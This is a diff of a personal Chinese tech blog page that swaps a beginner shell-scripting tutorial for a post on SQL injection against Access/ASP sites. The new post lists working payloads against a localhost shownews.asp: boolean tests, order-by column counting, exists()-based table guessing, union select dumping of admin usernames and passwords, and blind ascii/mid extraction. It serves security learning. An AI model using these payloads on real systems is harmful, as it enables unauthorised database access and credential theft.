@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Shell脚本初识, 子虫h的个人博客">
+    <meta name="keywords" content="access+asp注入, 子虫h的个人博客">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Shell脚本初识 | 子虫h的个人博客</title>
+    <title>access+asp注入 | 子虫h的个人博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -266,12 +266,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/12.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Shell脚本初识</h1>
+                    <h1 class="description center-align post-title">access+asp注入</h1>
                 </div>
             </div>
         </div>
@@ -387,12 +387,20 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/Shell%E8%84%9A%E6%9C%AC/">
-                                <span class="chip bg-color">Shell脚本</span>
+                            <a href="/tags/%E6%B8%97%E9%80%8F/">
+                                <span class="chip bg-color">渗透</span>
                             </a>
                         
-                            <a href="/tags/Linux/">
-                                <span class="chip bg-color">Linux</span>
+                            <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
+                                <span class="chip bg-color">SQL注入</span>
+                            </a>
+                        
+                            <a href="/tags/access/">
+                                <span class="chip bg-color">access</span>
+                            </a>
+                        
+                            <a href="/tags/asp/">
+                                <span class="chip bg-color">asp</span>
                             </a>
                         
                     </div>
@@ -403,8 +411,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/Linux/" class="post-category">
-                                Linux
+                            <a href="/categories/SQL%E6%B3%A8%E5%85%A5/" class="post-category">
+                                SQL注入
                             </a>
                         
                     </div>
@@ -416,7 +424,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-03-22
+                    2021-03-29
                 </div>
                 
 
@@ -440,126 +448,47 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                </br>
-</br>
-</br>
+                <h1 id="1-access-asp注入"><a href="#1-access-asp注入" class="headerlink" title="1.  access+asp注入"></a>1.  access+asp注入</h1></br>
+<pre class="line-numbers language-none"><code class="language-none">access 数据库与其他数据库不一样 他没有存储表的库，所以只能猜表.
+access数据库的结构为 表,字段,数据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<h1 id="1-简单认识Shell"><a href="#1-简单认识Shell" class="headerlink" title="1. 简单认识Shell"></a>1. 简单认识Shell</h1></br>
-
-<h2 id="1-1-Shell-的作用"><a href="#1-1-Shell-的作用" class="headerlink" title="1.1. Shell 的作用"></a>1.1. Shell 的作用</h2><pre class="line-numbers language-none"><code class="language-none">shell的作用 -- 命令解释器,&quot;翻译官&quot;,介于系统内核与用户之间,负责解释命令行
-登陆后默认使用的Shell程序一般为&#x2F;bin&#x2F;bash,不同Shell的内部指令,运行环境等会有所区别<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-</br>
-
-<h2 id="1-2-执行脚本文件"><a href="#1-2-执行脚本文件" class="headerlink" title="1.2. 执行脚本文件"></a>1.2. 执行脚本文件</h2><h3 id="1-2-1-方法一-脚本文件路径"><a href="#1-2-1-方法一-脚本文件路径" class="headerlink" title="1.2.1. 方法一: 脚本文件路径"></a>1.2.1. 方法一: 脚本文件路径</h3><pre class="line-numbers language-none"><code class="language-none">hacker@Hacker:~&#x2F;Desktop$ .&#x2F;hacker.sh
-其中,脚本文件必须要有x可执行权限,在当前环境直接运行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h3 id="1-2-2-方法二-sh脚本路径"><a href="#1-2-2-方法二-sh脚本路径" class="headerlink" title="1.2.2. 方法二: sh脚本路径"></a>1.2.2. 方法二: sh脚本路径</h3><pre class="line-numbers language-none"><code class="language-none">hacker@Hacker:~&#x2F;Desktop$ sh hacker.sh
-不需要x权限,相当于打开了一个Shell程序,将你脚本内容调到Shell里执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<h3 id="1-2-3-方法三-soure脚本文件路径"><a href="#1-2-3-方法三-soure脚本文件路径" class="headerlink" title="1.2.3. 方法三: soure脚本文件路径"></a>1.2.3. 方法三: soure脚本文件路径</h3><pre class="line-numbers language-none"><code class="language-none">hacker@Hacker:~&#x2F;Desktop$ soure hacker.sh
-不需要x权限,和sh一样,新开程序调用脚本内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<h1 id="2-编写第一个Shell脚本"><a href="#2-编写第一个Shell脚本" class="headerlink" title="2. 编写第一个Shell脚本"></a>2. 编写第一个Shell脚本</h1><h2 id="2-1-一般的编写格式"><a href="#2-1-一般的编写格式" class="headerlink" title="2.1. 一般的编写格式"></a>2.1. 一般的编写格式</h2><pre class="line-numbers language-none"><code class="language-none">#!&#x2F;bin&#x2F;bash
-#这个脚本展示了标准的Shell脚本格式
-
-#输出hello world
-echo hello world<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="1-1-判断是否存在注入"><a href="#1-1-判断是否存在注入" class="headerlink" title="1.1. 判断是否存在注入"></a>1.1. 判断是否存在注入</h2></br>
+<pre class="line-numbers language-none"><code class="language-none">1. and判断
+    1. http:&#x2F;&#x2F;127.0.0.1&#x2F;shownews.asp?id&#x3D;1 and 1&#x3D;1 返回正确页面
+    2. http:&#x2F;&#x2F;127.0.0.1&#x2F;shownews.asp?id&#x3D;1 and 1&#x3D;2 返回错误页面
+2. or判断
+    1. http:&#x2F;&#x2F;127.0.0.1&#x2F;shownews.asp?id&#x3D;1 or 1&#x3D;1 返回正常页面
+    2. http:&#x2F;&#x2F;127.0.0.1&#x2F;shownews.asp?id&#x3D;-1 or 1&#x3D;2 返回错误页面<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 </br>
 
-<h2 id="2-2-Shell的变量"><a href="#2-2-Shell的变量" class="headerlink" title="2.2. Shell的变量"></a>2.2. Shell的变量</h2></br>
+<h2 id="1-2-判断字段数"><a href="#1-2-判断字段数" class="headerlink" title="1.2. 判断字段数"></a>1.2. 判断字段数</h2></br>
+<pre class="line-numbers language-none"><code class="language-none">order by判断当前表的字段数
+order by的意思是按照第几列排序,当列数超出当前表的时候就会报错,从而判断当前表的字段数
+    1. http:&#x2F;&#x2F;127.0.0.1&#x2F;shownews.asp?id&#x3D;1 order by 1 页面返回正常
+    2. http:&#x2F;&#x2F;127.0.0.1&#x2F;shownews.asp?id&#x3D;1 order by 10 页面返回正常
+    3. http:&#x2F;&#x2F;127.0.0.1&#x2F;shownews.asp?id&#x3D;1 order by 11 页面返回错误<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+</br>
 
-<h3 id="2-2-1-变量的作用"><a href="#2-2-1-变量的作用" class="headerlink" title="2.2.1. 变量的作用"></a>2.2.1. 变量的作用</h3><pre class="line-numbers language-none"><code class="language-none">为灵活管理Linux系统提供的特定参数,有两层意思
-    * 变量名: 使用固定的名称,有系统预设或用户自定义
-    * 变量值: 能够根据用户设置,系统环境的变化而变化<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h2 id="1-3-猜解表名"><a href="#1-3-猜解表名" class="headerlink" title="1.3. 猜解表名"></a>1.3. 猜解表名</h2></br>
 
-<h3 id="2-2-2-变量的类型"><a href="#2-2-2-变量的类型" class="headerlink" title="2.2.2. 变量的类型"></a>2.2.2. 变量的类型</h3><pre class="line-numbers language-none"><code class="language-none">自定义变量: 有用户自己定义,修改和使用
-环境变量: 有系统维护,用于设置工作环境
-位置变量: 通过命令行给脚本程序传递参数
-预定义变量: Bash中内置的一类变量,不能直接修改<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">access只能暴力猜解表名
+    1. http:&#x2F;&#x2F;127.0.0.1&#x2F;shownews.asp?id&#x3D;1 and exists(select * from admin) ---&gt; 如果admin表不存在则报错 
+    2. http:&#x2F;&#x2F;127.0.0.1&#x2F;shownews.asp?id&#x3D;1 union select 1,2,3,4,5,6,7,8,9,10 from admin 页面返回2,3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/zichong-h/images/main/1617030443_20210329230655268_59.png"></p>
+<h2 id="1-4-猜解内容"><a href="#1-4-猜解内容" class="headerlink" title="1.4. 猜解内容"></a>1.4. 猜解内容</h2></br>
 
-<h3 id="2-2-3-变量的定义"><a href="#2-2-3-变量的定义" class="headerlink" title="2.2.3. 变量的定义"></a>2.2.3. 变量的定义</h3><p>变量名以字母或下划线开头,区分大小写,建议全大写</p>
-<pre class="line-numbers language-none"><code class="language-none">hacker@Hacker:~&#x2F;Desktop$ name&#x3D;zichongh
-hacker@Hacker:~&#x2F;Desktop$ echo $name
-zichongh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<h3 id="2-2-4-变量的赋值"><a href="#2-2-4-变量的赋值" class="headerlink" title="2.2.4. 变量的赋值"></a>2.2.4. 变量的赋值</h3><ol>
-<li>赋值时使用引号</li>
-</ol>
-<ul>
-<li><p>双引号: 允许通过$符号引用其他变量值</p>
-<pre class="line-numbers language-none"><code class="language-none">hacker@Hacker:~&#x2F;Desktop$ a&#x3D;whoami
-hacker@Hacker:~&#x2F;Desktop$ b&#x3D;&quot;$a&quot;
-hacker@Hacker:~&#x2F;Desktop$ echo $b
-whoami<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p>单引号: 禁止引用其他变量值,$视为普通值</p>
-</li>
-</ul>
-<pre class="line-numbers language-none"><code class="language-none">hacker@Hacker:~&#x2F;Desktop$ a&#x3D;whoami
-hacker@Hacker:~&#x2F;Desktop$ b&#x3D;&#39;$a&#39;
-hacker@Hacker:~&#x2F;Desktop$ echo $b
-$a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<ul>
-<li>反撇号: 命令替换,提取命令执行后的输出结果</li>
-</ul>
-<pre class="line-numbers language-none"><code class="language-none">hacker@Hacker:~&#x2F;Desktop$ a&#x3D;whoami
-hacker@Hacker:~&#x2F;Desktop$ b&#x3D;&#96;$a&#96;
-hacker@Hacker:~&#x2F;Desktop$ echo $b
-hacker<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">查询内容长度
+    http:&#x2F;&#x2F;127.0.0.1&#x2F;shownews.asp?id&#x3D;1 and (select top 1 len(username) from admin)&#x3D;8 --&gt; 如果username长度不是8则报错
 
 
-<ol start="2">
-<li>从键盘输入内容为变量赋值</li>
-</ol>
-<pre class="line-numbers language-none"><code class="language-none">read [-p &quot;提示信息&quot;] 变量名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<pre class="line-numbers language-none"><code class="language-none">脚本内容
-    #!&#x2F;bin&#x2F;bash
-    read -p &quot;plese input your name:&quot; username
-    echo $username
-执行结果
-    hacker@Hacker:~&#x2F;Desktop$ sh 1.sh 
-    plese input your name:zichongh
-    zichongh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<ol start="3">
-<li><p>设置变量的作用范围<br> 声明变量后如果切换bash环境后就无法使用变量,需要加个export将变量设置成全局变量.多用于试图修改环境变量PATH时或者有子bash的脚本</p>
- <pre class="line-numbers language-none"><code class="language-none">格式1: export 变量名...
-格式2: export 变量名&#x3D;变量值...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
-<li><p>整数变量的运算</p>
-</li>
-</ol>
-<pre class="line-numbers language-none"><code class="language-none">expr 变量1 运算符 变量2
-
-常用运算符
-* 加法运算: +
-* 减法运算: -
-* 乘法运算: \*
-* 除法运算: &#x2F;
-* 求模(取余)运算: %<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<ol start="5">
-<li>特殊的Shell变量</li>
-</ol>
-<ul>
-<li>环境变量 <pre class="line-numbers language-none"><code class="language-none">由系统提前创建,用来设置用户的工作环境
-配置文件: &#x2F;etc&#x2F;profile, ~&#x2F;.bash_profile
-常见的环境变量有:
-    * PWD、PATH
-    * USER、SHELL、HOME<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li>位置变量  <pre class="line-numbers language-none"><code class="language-none">表示为$n, n为1-9之间的数字<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-  <pre class="line-numbers language-none"><code class="language-none">脚本内容
-    #!&#x2F;bin&#x2F;bash
-    echo $2
-    echo $3
-
-输出内容
-    hacker@Hacker:~&#x2F;Desktop$ sh 1.sh 11 22 33 44
-    22
-    33<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li>预定义变量  <pre class="line-numbers language-none"><code class="language-none">$#: 命令行中位置变量的个数
-$*: 所有位置变量的内容
-$?: 上一条命令执行后返回的状态,当返回状态值为0时表示执行正常,非0值表示执行异常或出错
-$0: 当前执行的进程&#x2F;程序名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li>
-</ul>
+ascii码猜解字段名
+    mid(str,2,1)截取str第二位的一个字符  asc()ascii码转换
+    http:&#x2F;&#x2F;127.0.0.1&#x2F;shownews.asp?id&#x3D;1 and (select top 1 asc(mid(username,1,1)) from admin)&#x3D;97 --&gt; 如果username的值第一位ascii值不为97则报错
+    
+查询到字段名后查询数据
+    1. http:&#x2F;&#x2F;127.0.0.1&#x2F;shownews.asp?id&#x3D;1 and exists (select username from admin) --&gt; 如果username列不存在则报错
+    2. http:&#x2F;&#x2F;127.0.0.1&#x2F;shownews.asp?id&#x3D;1 union select 1,username,password,4,5,6,7,8,9,10 from admin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/zichong-h/images/main/1617031206_20210329231945197_29836.png"></p>
 
                 
             </div>
@@ -586,7 +515,7 @@ $0: 当前执行的进程&#x2F;程序名<span aria-hidden="true" class="line-num
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://zichong-h.github.io/2021/03/22/shell%E8%84%9A%E6%9C%AC/">http://zichong-h.github.io/2021/03/22/shell%E8%84%9A%E6%9C%AC/</a>
+                    <a href="http://zichong-h.github.io/2021/03/29/access+asp%E6%B3%A8%E5%85%A5/">http://zichong-h.github.io/2021/03/29/access+asp%E6%B3%A8%E5%85%A5/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -624,12 +553,20 @@ $0: 当前执行的进程&#x2F;程序名<span aria-hidden="true" class="line-num
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/Shell%E8%84%9A%E6%9C%AC/">
-                                    <span class="chip bg-color">Shell脚本</span>
+                                <a href="/tags/%E6%B8%97%E9%80%8F/">
+                                    <span class="chip bg-color">渗透</span>
                                 </a>
                             
-                                <a href="/tags/Linux/">
-                                    <span class="chip bg-color">Linux</span>
+                                <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
+                                    <span class="chip bg-color">SQL注入</span>
+                                </a>
+                            
+                                <a href="/tags/access/">
+                                    <span class="chip bg-color">access</span>
+                                </a>
+                            
+                                <a href="/tags/asp/">
+                                    <span class="chip bg-color">asp</span>
                                 </a>
                             
                         </div>
@@ -801,9 +738,10 @@ $0: 当前执行的进程&#x2F;程序名<span aria-hidden="true" class="line-num
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2021/03/29/access+asp%E6%B3%A8%E5%85%A5/">
                     <div class="card-image">
@@ -821,9 +759,9 @@ $0: 当前执行的进程&#x2F;程序名<span aria-hidden="true" class="line-num
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-03-29
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-29
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -836,6 +774,7 @@ $0: 当前执行的进程&#x2F;程序名<span aria-hidden="true" class="line-num
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -863,7 +802,7 @@ $0: 当前执行的进程&#x2F;程序名<span aria-hidden="true" class="line-num
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
                 <a href="/2021/03/22/shell%E8%84%9A%E6%9C%AC/">
@@ -897,7 +836,6 @@ $0: 当前执行的进程&#x2F;程序名<span aria-hidden="true" class="line-num
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
